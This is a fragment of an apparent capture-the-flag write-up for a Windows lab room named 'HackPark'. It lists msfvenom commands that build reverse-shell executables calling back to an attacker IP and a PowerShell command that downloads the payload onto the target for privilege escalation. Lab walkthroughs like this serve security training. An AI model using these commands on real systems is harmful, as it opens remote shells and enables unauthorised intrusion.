...
- Create a reverse shell ``msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.127.225 LPORT=7777 -f exe > thm/rooms/hackpark/reverse.exe`` and upload.
...
## [](#header-2)Task 5 - Privilege Escalation Without Metasploit 
...
- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.2.127.225 LPORT=6666 -f exe -o reverse_privesc.exe``
...
2. powershell over to target ``powershell -c "Invoke-WebRequest -Uri '10.2.127.225:8000/reverse_privesc.exe' -OutFile 'C:\Windows\Temp\shell.exe'"``
